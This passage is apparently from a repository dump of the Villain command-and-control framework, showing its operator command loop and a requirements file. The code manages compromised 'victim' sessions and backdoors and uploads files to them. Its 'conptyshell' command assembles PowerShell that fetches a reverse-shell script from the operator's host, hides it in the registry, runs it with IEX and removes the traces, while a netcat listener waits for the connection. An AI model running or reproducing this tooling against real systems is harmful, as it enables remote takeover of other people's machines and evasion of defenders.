True\n\t\t\t\t\t\tcontinue\n\n\t\t\t\t\tsessions_check = Sessions_Manager.sessions_check(cmd_list[1])\n\t\t\t\t\t\n\t\t\t\t\tif sessions_check[0]:\n\n\t\t\t\t\t\tkey = cmd_list[2].lower().strip()\n\t\t\t\t\t\t\n\t\t\t\t\t\tif key in ['hostname', 'username']:\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tresult = sessions_manager.repair(cmd_list[1], key, cmd_list[3])\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif isinstance(result, list):\n\t\t\t\t\t\t\t\tprint(result[0])\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\telif result == 0:\n\t\t\t\t\t\t\t\tprint('Success.')\n\t\t\t\t\t\t\t\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tprint(f'Repair function not applicable on \"{key}\". Try HOSTNAME or USERNAME.')\n\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint(sessions_check[1])\t\t\t\t\t\t\t\n\n\n\n\t\t\t\telif cmd == 'reset':\n\n\t\t\t\t\talias = cmd_list[1]\t\t\t\t\t\n\t\t\t\t\tsid = Sessions_Manager.alias_to_session_id(alias)\n\t\t\t\t\t\n\t\t\t\t\tif sid == alias:\n\t\t\t\t\t\tprint('Unrecognized alias.')\n\t\t\t\t\t\n\t\t\t\t\telif sid in Sessions_Manager.active_sessions.keys():\n\t\t\t\t\t\tSessions_Manager.active_sessions[sid]['aliased'] = False\n\t\t\t\t\t\tSessions_Manager.active_sessions[sid]['alias'] = None\n\t\t\t\t\t\tSessions_Manager.aliases.remove(alias)\n\t\t\t\t\t\tprint(f'Alias for session {sid} successfully reset.')\n\t\t\t\t\t\t\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint('Unrecognized alias.')\n\n\n\n\t\t\t\telif cmd == 'clear':\n\t\t\t\t\tos.system('clear')\n\n\n\n\t\t\t\telif cmd == 'flee':\n\t\t\t\t\tvillain_out(flee = True)\n\n\n\n\t\t\t\telif cmd == 'exit':\n\t\t\t\t\traise KeyboardInterrupt\n\n\n\n\t\t\t\telif cmd == 'sessions':\t\t\t\t\t\t\t\n\t\t\t\t\tsessions_manager.list_sessions()\n\n\n\n\t\t\t\telif cmd == 'backdoors':\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\tsessions_manager.list_backdoors()\n\n\n\n\t\t\t\telif cmd == 'sockets':\t\n\t\t\t\t\tprint_running_services_info()\t\t\t\t\n\n\n\n\t\t\t\telif cmd == 'siblings':\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\tcore.list_siblings()\n\n\n\n\t\t\t\telif cmd == 'threads':\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\tprint(f'\\nThread limiter value: {Threading_params.thread_limiter._value}')\n\t\t\t\t\tthreads = enumerate_threads()\n\t\t\t\t\tthread_names = []\n\n\t\t\t\t\tprint(f\"Active threads ({len(threads)}):\\n\")\n\t\t\t\t\tfor thread in threads:\n\t\t\t\t\t\tthread_names.append(thread.name)\n\n\t\t\t\t\tprint_columns(thread_names)\n\n\n\t\t\t\telif cmd == 'upload':\n\n\t\t\t\t\tMain_prompt.ready = False\n\t\t\t\t\tfile_path = os.path.expanduser(cmd_list[1])\n\n\t\t\t\t\t# Check if session id has alias\n\t\t\t\t\tsession_id = sessions_manager.alias_to_session_id(cmd_list[3])\n\t\t\t\t\t\n\t\t\t\t\tif not session_id:\n\t\t\t\t\t\tprint('Failed to interpret session_id.')\n\t\t\t\t\t\tMain_prompt.ready = True\n\t\t\t\t\t\tcontinue\t\n\n\t\t\t\t\tsessions_check = Sessions_Manager.sessions_check(session_id)\n\t\t\t\t\t\n\t\t\t\t\tif sessions_check[0]:\t\t\t\t\t\t\t\n\n\t\t\t\t\t\t# Check if file exists\n\t\t\t\t\t\tif os.path.isfile(file_path):\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t# Get file contents\n\t\t\t\t\t\t\tfile_contents = get_file_contents(file_path)\n\n\t\t\t\t\t\t\tif file_contents:\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t# Check if any sibling server has an active pseudo shell on that session\n\t\t\t\t\t\t\t\tshell_occupied = core.is_shell_session_occupied(session_id)\n\n\t\t\t\t\t\t\t\tif not shell_occupied:\t\n\t\t\t\t\t\t\t\t\t# Check who is the owner of the shell session\n\t\t\t\t\t\t\t\t\tsession_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tif session_owner_id == core.return_server_uniq_id():\n\t\t\t\t\t\t\t\t\t\tFile_Smuggler.upload_file(file_contents, cmd_list[2], session_id)\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\telse:\t\t\n\t\t\t\t\t\t\t\t\t\tcore.send_receive_one_encrypted(session_owner_id, [file_contents, cmd_list[2], session_id], 'upload_file')\n\n\t\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\t\tprint(f'\\r[{INFO}] The session is currently being used by a sibling server.')\n\t\t\t\t\t\t\t\t\tMain_prompt.ready = True\n\t\t\t\t\t\t\t\t\tcontinue\t\n\t\t\t\t\t\t\t\t\t\n\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tprint(f'\\r[{ERR}] File {file_path} not found.')\n\t\t\t\t\t\t\tMain_prompt.ready = True\n\n\t\t\t\t\t\t# Reset prompt if session status is Undefined or Lost \n\t\t\t\t\t\tif Sessions_Manager.active_sessions[session_id]['Status'] in ['Undefined', 'Lost']:\n\t\t\t\t\t\t\tMain_prompt.ready = True\n\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint(sessions_check[1])\n\t\t\t\t\t\tMain_prompt.ready = True\n\n\n\n\t\t\t\telif cmd == 'conptyshell':\n\t\t\t\t\t\n\t\t\t\t\tlhost = parse_lhost(cmd_list[1])\n\t\t\t\t\ttry: lport = int(cmd_list[2])\n\t\t\t\t\texcept: lport = -1\t\t\t\t\t\n\t\t\t\t\tsession_id = cmd_list[3]\n\t\t\t\t\tsessions_check = Sessions_Manager.sessions_check(session_id)\n\t\t\t\t\t\n\t\t\t\t\tif sessions_check[0]:\n\t\t\t\t\t\t\n\t\t\t\t\t\t# Parse LHOST\n\t\t\t\t\t\tif not lhost:\n\t\t\t\t\t\t\tprint(f'\\r[{ERR}] Failed to parse LHOST value.')\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\t\n\t\t\t\t\t\t# Parse LPORT\t\t\t\t\t\n\t\t\t\t\t\tif not (lport >= 1 and lport <= 65535):\n\t\t\t\t\t\t\tprint(f'\\r[{ERR}] Failed to parse LPORT value.')\n\t\t\t\t\t\t\tcontinue\n\n\t\t\t\t\t\t# Check if shell type is compatible\n\t\t\t\t\t\tshell_type = Sessions_Manager.active_sessions[session_id]['Shell']\n\n\t\t\t\t\t\tif shell_type not in ['powershell.exe']:\n\t\t\t\t\t\t\tprint(f'\\r[{ERR}] Operation not supported for this shell type.')\n\t\t\t\t\t\t\tcontinue\n\n\t\t\t\t\t\t# Check who is the owner of the shell session\n\t\t\t\t\t\tsession_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')\n\n\t\t\t\t\t\t# Prepare ConPtyShell\n\t\t\t\t\t\tif not os.path.isfile(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1'):\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tprint(f'\\r[{ERR}] Invoke-ConPtyShell.ps1 not found.')\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\t\n\t\t\t\t\t\tscript_data = get_file_contents(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1', mode = 'r')\n\t\t\t\t\t\tfunc_name = value_name = get_random_str(10)\n\t\t\t\t\t\tscript_data = script_data.replace('*LHOST*', lhost).replace('*LPORT*', str(lport)).replace('*FUNC*', func_name)\n\n\t\t\t\t\t\t# Create ticket for http smuggling\n\t\t\t\t\t\tticket = str(uuid4())\n\t\t\t\t\t\tFile_Smuggler.file_transfer_tickets[ticket] = {'data' : script_data, 'issuer' : 'self', 'lifespan' : 1, 'reset_prompt' : False}\n\n\t\t\t\t\t\t# The script constructed below requests and stores ConPtyShell in registry. \n\t\t\t\t\t\t# It then loads the script twice for the following reasons:\n\t\t\t\t\t\t#    1) Check if it's loading properly before running it as a new process\n\t\t\t\t\t    #       because if it was run as a new process immediately and something\n\t\t\t\t\t\t#       went wrong, the user would not receive stderr.\n\t\t\t\t\t\t#    2) Run as a new process, given that the first pre-flight check didn't error out.\n\n\t\t\t\t\t\t# Construct Villain issued command to request and exec ConPtyShell\n\t\t\t\t\t\trand_key = get_random_str(5)\n\t\t\t\t\t\tvalue_name = get_random_str(5)\n\t\t\t\t\t\tscript_src = f'http://{lhost}:{File_Smuggler_Settings.bind_port}/{ticket}'\n\t\t\t\t\t\treg_polution = f'New-Item -Path \"HKCU:\\\\SOFTWARE\\\\{rand_key}\" -Force | Out-Null;New-ItemProperty -Path \"HKCU:\\\\SOFTWARE\\\\{rand_key}\" -Name \"{value_name}\" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'\n\t\t\t\t\t\texec_script = f'(Get-ItemPropertyValue -Path \"HKCU:\\\\SOFTWARE\\\\{rand_key}\\\" -Name \"{value_name}\" | IEX) | Out-Null'\n\t\t\t\t\t\tremove_src = f'Remove-Item -Path \"HKCU:\\\\Software\\\\{rand_key}\" -Recurse'\n\t\t\t\t\t\tnew_proc = Exec_Utils.new_process_wrapper(f\"{exec_script}; {func_name}; {remove_src}\", session_id)\n\t\t\t\t\t\texecution_object = Exec_Utils.ps_try_catch_wrapper(f'{reg_polution};{exec_script};({new_proc})', error_action = remove_src)\n\t\t\t\t\t\t\n\t\t\t\t\t\t#print(execution_object)\n\n\t\t\t\t\t\tvillain_cmd = {\n\t\t\t\t\t\t\t'data' : execution_object,\n\t\t\t\t\t\t\t'quiet' : False\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Append script for execution\n\t\t\t\t\t\tif session_owner_id == core.return_server_uniq_id():\n\n\t\t\t\t\t\t\tvillain_cmd['issuer'] = 'self'\n\n\t\t\t\t\t\t\t# Start listener\n\t\t\t\t\t\t\tos.system(f'gnome-terminal -- bash -c \"stty raw -echo; (stty size; cat) | nc -lvnp {lport}\"')\n\t\t\t\t\t\t\tsleep(0.2)\n\t\t\t\t\t\t\tHoaxshell.command_pool[session_id].append(villain_cmd)\n\n\t\t\t\t\t\telse:\n\n\t\t\t\t\t\t\ttry:\n\t\t\t\t\t\t\t\tverified = input(f'\\r[{WARN}] This session belongs to a sibling server. If the victim host cannot directly reach your host, this operation will fail. Proceed? [y/n]: ')\n\t\t\t\t\t\t\texcept:\n\t\t\t\t\t\t\t\tprint()\n\t\t\t\t\t\t\t\tverified = None\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif verified.lower().strip() in ['y', 'yes']:\n\t\t\t\t\t\t\t\t# Start listener\n\t\t\t\t\t\t\t\tos.system(f'gnome-terminal -- bash -c \"stty raw -echo; (stty size; cat) | nc -lvnp {lport}\"')\n\t\t\t\t\t\t\t\tvillain_cmd['issuer'] = core.return_server_uniq_id()\n\t\t\t\t\t\t\t\tCore_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, villain_cmd)\n\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint(sessions_check[1])\n\n\t\t\t\t\t\t\n\n\t\t\t\telif cmd == 'cmdinspector':\n\n\t\t\t\t\toption = cmd_list[1].lower()\n\n\t\t\t\t\tif option in ['on', 'off']:\n\n\t\t\t\t\t\tif option == 'off':\n\t\t\t\t\t\t\tSession_Defender.is_active = False\n\n\t\t\t\t\t\telif option == 'on':\n\t\t\t\t\t\t\tSession_Defender.is_active = True\n\t\t\t\t\t\t\n\t\t\t\t\t\tprint(f'Session Defender is turned {option}.')\n\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint('Value can be on or off.')\n\n\n\n\t\t\t\telif cmd == 'purge':\n\n\t\t\t\t\ttry:\n\t\t\t\t\t\tchk = input('This operation will delete all stored metadata (run \"help purge\" for more info). Proceed? [y/n]: ')\n\t\t\t\t\texcept:\n\t\t\t\t\t\tprint()\n\t\t\t\t\t\tcontinue\n\n\t\t\t\t\tif chk.lower().strip() in ['yes', 'y']:\n\t\t\t\t\t\tcm = clear_metadata()\n\t\t\t\t\t\tprint(f'Operation completed.') if cm else print('Something went wrong.')\n\n\t\t\t\t\telse:\n\t\t\t\t\t\tcontinue\n\n\n\t\t\t\telif cmd == 'redirectors':\n\t\t\t\t\t\n\t\t\t\t\tshell_redirectors = list(Sessions_Manager.shell_redirectors.keys())\n\n\t\t\t\t\tif len(cmd_list) == 1:\n\t\t\t\t\t\tif shell_redirectors:\n\t\t\t\t\t\t\ti = 0\n\t\t\t\t\t\t\tprint(f'\\n{BOLD}Shell Redirectors{END}\\n')\n\t\t\t\t\t\t\tprint('ID   Session               Sibling')\n\t\t\t\t\t\t\tprint('---  --------------------  --------------------------------')\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tfor sid in shell_redirectors:\n\t\t\t\t\t\t\t\tprint(f'{i:3d}  {sid}  {Sessions_Manager.shell_redirectors[sid]}')\n\t\t\t\t\t\t\t\ti += 1\n\t\t\t\t\t\t\tprint()\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tprint('No active redirectors.')\n\n\t\t\t\t\tif len(cmd_list) == 2:\n\t\t\t\t\t\tprint('Missing arguments.')\n\n\t\t\t\t\telif len(cmd_list) == 3:\n\t\t\t\t\t\toperation = cmd_list[1].lower().strip()\n\t\t\t\t\t\tif operation == 'pop':\n\t\t\t\t\t\t\ttry:\n\t\t\t\t\t\t\t\tredirector_id = int(cmd_list[2])\n\t\t\t\t\t\t\texcept:\n\t\t\t\t\t\t\t\tredirector_id = False\n\t\t\t\t\t\t\t\tprint('Redirector id must be integer.')\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tredirectors_len = len(shell_redirectors)\n\t\t\t\t\t\t\tif not redirectors_len:\n\t\t\t\t\t\t\t\tprint('No active redirectors detected.')\n\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\tif redirector_id <= redirectors_len and redirector_id >= 0:\n\t\t\t\t\t\t\t\t\tfor i in range(0, redirectors_len):\n\t\t\t\t\t\t\t\t\t\tif i == redirector_id:\n\t\t\t\t\t\t\t\t\t\t\tshell_occupied = core.is_shell_session_occupied(shell_redirectors[i])\n\t\t\t\t\t\t\t\t\t\t\tif shell_occupied:\n\t\t\t\t\t\t\t\t\t\t\t\tchoice = input('This shell session seems to be occupied by a sibling server. Are you sure you want to remove the traffic redirector? [Y/n]: ')\n\t\t\t\t\t\t\t\t\t\t\t\tif choice.lower().strip() in ['y', 'yes']:\n\t\t\t\t\t\t\t\t\t\t\t\t\tdel Sessions_Manager.shell_redirectors[shell_redirectors[i]]\n\t\t\t\t\t\t\t\t\t\t\t\t\tprint('Redirector removed.')\n\t\t\t\t\t\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\t\t\t\t\t\tprint('Operation aborted.')\n\t\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\t\tprint('Redirector ID does not exist.')\n\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tprint(f'Unknown operation: {operation}')\n\n\n\n\t\t\t\t\telse:\n\t\t\t\t\t\tcontinue\n\n\n\t\t\t\telse:\n\t\t\t\t\tcontinue\n\t\t\n\t\t\n\t\texcept KeyboardInterrupt:\n\t\t\t\n\t\t\tif not Main_prompt.ready:\n\t\t\t\tMain_prompt.ready = True\n\t\t\t\tcontinue\n\n\t\t\tif global_readline.get_line_buffer(): \n\t\t\t\tsys.stdout.flush()\n\t\t\t\tprint()\n\t\t\t\tcontinue\n\t\t\t\n\t\t\tif Main_prompt.exec_active:\n\t\t\t\tMain_prompt.exec_active = False\n\t\t\t\tprint('\\r')\n\t\t\t\tcontinue\n\n\t\t\tvillain_out()\n\t\t\t\n\nif __name__ == '__main__':\n\tmain()\n"
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0.0537109375,
          "content": "netifaces\npycryptodomex\npyperclip\nRequests\ngnureadline\n"
        }
      ]
    }
  ]
}